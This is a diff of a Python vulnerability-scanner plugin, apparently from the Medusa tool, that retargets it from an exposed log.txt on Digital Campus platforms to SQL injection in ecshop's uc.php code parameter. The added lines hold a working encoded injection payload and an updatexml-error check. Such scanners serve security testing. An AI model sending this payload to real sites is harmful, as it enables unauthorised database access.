@@ -1,11 +1,10 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: Digital-Campus数字校园平台LOG文件泄露
-referer: http://www.wooyun.org/bugs/wooyun-2014-071575
+name: ecshop uc.php参数code SQL注入
+referer: http://www.wooyun.org/bugs/WooYun-2016-174468
 author: Lucifer
-modify: Ascotbe
-description: 关键词：intitle:数字校园平台--Digital Campus2.0 Platform。log.txt日志文件泄露，可获取数据库账号等敏感信息。
+description: 文件uc.php中,参数code存在SQL注入。
 '''
 import urllib
 import requests
@@ -17,8 +16,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-payload = "/log.txt"
-pattern = re.compile(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}')
+payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
 def medusa(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
@@ -42,13 +40,13 @@ def medusa(Url,RandomAgent,ProxyIp):
                 # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                 "http": "http://" + str(ProxyIp)
             }
-            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
+            resp = requests.get(payload_url,  headers=headers, proxies=proxies, timeout=5, verify=False)
         elif ProxyIp==None:
             resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
-        con =  pattern.findall(resp.text)
+        con = resp.text
         code = resp.status_code
-        if len(con) != 0:
-            Medusa = "{} 存在Digital Campus2.0 Platform日志文件泄露\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
+        if con.lower().find('xpath')!=-1 and con.lower().find('updatexml')!=-1:
+            Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
             return (Medusa)
     except Exception as e:
         pass
